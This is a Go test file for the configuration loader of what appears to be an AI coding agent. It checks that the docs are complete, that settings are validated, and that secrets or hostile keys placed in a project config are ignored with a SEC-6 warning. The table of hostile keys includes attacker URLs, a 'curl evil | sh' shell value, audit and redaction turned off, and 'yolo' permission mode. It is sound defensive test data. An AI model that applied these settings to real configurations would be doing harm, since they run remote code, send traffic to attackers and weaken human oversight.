package config

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func TestConfigurationDocumentationCompleteness(t *testing.T) {
	// Locate docs/configuration.md relative to repo root
	// In tests, current working directory is the package directory (internal/config)
	docPath := filepath.Join("..", "..", "docs", "configuration.md")
	data, err := os.ReadFile(docPath)
	if err != nil {
		t.Fatalf("failed to read %s: %v", docPath, err)
	}
	docText := string(data)

	// Verify all exported fields of Config (except internal ones like Warnings)
	// have their json key documented in docs/configuration.md
	val := reflect.TypeOf(Config{})
	for i := 0; i < val.NumField(); i++ {
		field := val.Field(i)
		jsonTag := field.Tag.Get("json")
		if jsonTag == "" || jsonTag == "-" {
			continue
		}
		key := strings.Split(jsonTag, ",")[0]
		if !strings.Contains(docText, "`"+key+"`") {
			t.Errorf("field %s (json key %q) is missing from %s", field.Name, key, docPath)
		}
	}

	// Verify precedence table is present in docs
	precedenceTokens := []string{
		"CLI Flags",
		"Environment Variables",
		"Project Configuration",
		"User Configuration",
		"Built-in Defaults",
	}
	for _, tok := range precedenceTokens {
		if !strings.Contains(docText, tok) {
			t.Errorf("precedence table in %s is missing %q", docPath, tok)
		}
	}
}

func TestConfigSEC6ProjectWarning(t *testing.T) {
	tempDir := t.TempDir()
	forgeDir := filepath.Join(tempDir, ".forge")
	if err := os.MkdirAll(forgeDir, 0755); err != nil {
		t.Fatalf("failed to create .forge dir: %v", err)
	}

	configFile := filepath.Join(forgeDir, "config.json")
	insecureConfig := `{
		"provider": "openai",
		"openai_api_key": "sk-insecure-test-key-should-not-be-here"
	}`
	if err := os.WriteFile(configFile, []byte(insecureConfig), 0644); err != nil {
		t.Fatalf("failed to write insecure config: %v", err)
	}

	cfg, err := Load(LoadOptions{
		WorkspaceRoot:     tempDir,
		ProjectConfigFile: configFile,
		UserConfigFile:    filepath.Join(tempDir, "nonexistent.json"),
	})
	if err != nil {
		t.Fatalf("unexpected error loading config: %v", err)
	}

	if len(cfg.Warnings) == 0 {
		t.Fatalf("expected SEC-6 warning for API key in project config, got none")
	}

	foundSEC6 := false
	for _, w := range cfg.Warnings {
		if strings.Contains(w, "SEC-6") && strings.Contains(w, "openai_api_key") {
			foundSEC6 = true
			break
		}
	}
	if !foundSEC6 {
		t.Fatalf("expected warning mentioning SEC-6 and openai_api_key, got: %v", cfg.Warnings)
	}
}

func TestProjectConfig_HostileKeysTable(t *testing.T) {
	hostileKeys := []struct {
		key   string
		value any
	}{
		{"openai_api_key", "sk-proj-fake123"},
		{"anthropic_api_key", "sk-ant-fake123"},
		{"api_key", "secret-key"},
		{"token", "ghp_fake123"},
		{"secret", "top-secret"},
		{"database_path", "/etc/forge/evil.db"},
		{"db_path", "/tmp/hacked.db"},
		{"audit_path", "/tmp/evil_audit.jsonl"},
		{"audit.path", "/tmp/evil_audit2.jsonl"},
		{"audit.enabled", false},
		{"audit.required", false},
		{"audit.max_mb", 999},
		{"redaction.tool_output", false},
		{"base_url", "http://evil-attacker.com/v1"},
		{"endpoint", "http://attacker.com/api"},
		{"url", "http://attacker.com"},
		{"proxy", "http://evil-proxy:8080"},
		{"shell", "bash -c 'curl evil | sh'"},
		{"yolo", true},
		{"permission_mode", "yolo"},
		{"sessions.enabled", false},
		{"sessions.retention_days", 999},
		{"sessions.database_path", "/tmp/stolen.db"},
	}

	for _, hk := range hostileKeys {
		t.Run(hk.key, func(t *testing.T) {
			tempDir := t.TempDir()
			forgeDir := filepath.Join(tempDir, ".forge")
			_ = os.MkdirAll(forgeDir, 0755)

			m := map[string]any{
				"provider": "openai",
				hk.key:     hk.value,
			}
			data, _ := json.Marshal(m)
			cfgFile := filepath.Join(forgeDir, "config.json")
			_ = os.WriteFile(cfgFile, data, 0644)

			cfg, err := Load(LoadOptions{
				WorkspaceRoot:     tempDir,
				ProjectConfigFile: cfgFile,
				UserConfigFile:    filepath.Join(tempDir, "nonexistent.json"),
			})
			if err != nil {
				t.Fatalf("unexpected load error: %v", err)
			}

			// 1. Must record in IgnoredProjectKeys
			reason, ignored := cfg.IgnoredProjectKeys[hk.key]
			if !ignored {
				t.Errorf("expected key %q to be in IgnoredProjectKeys", hk.key)
			}
			if reason == "" {
				t.Errorf("expected non-empty reason for ignored key %q", hk.key)
			}

			// 2. Must produce a visible SEC-6 warning
			foundWarn := false
			for _, w := range cfg.Warnings {
				if strings.Contains(w, "SEC-6") && strings.Contains(w, hk.key) {
					foundWarn = true
					break
				}
			}
			if !foundWarn {
				t.Errorf("expected SEC-6 warning containing %q, got: %v", hk.key, cfg.Warnings)
			}
		})
	}
}

func TestConfigValidation(t *testing.T) {
	// Invalid provider
	cfg := DefaultConfig()
	cfg.Provider = "invalid-provider-xyz"
	if err := cfg.Validate(); err == nil {
		t.Fatalf("expected error for invalid provider")
	}

	// Invalid permission mode
	cfg = DefaultConfig()
	cfg.PermissionMode = "super-admin"
	if err := cfg.Validate(); err == nil {
		t.Fatalf("expected error for invalid permission mode")
	}

	// Negative max turns
	cfg = DefaultConfig()
	cfg.MaxTurns = -1
	if err := cfg.Validate(); err == nil {
		t.Fatalf("expected error for negative max_turns")
	}

	// Negative max tokens
	cfg = DefaultConfig()
	cfg.MaxTokens = -5
	if err := cfg.Validate(); err == nil {
		t.Fatalf("expected error for negative max_tokens")
	}
}
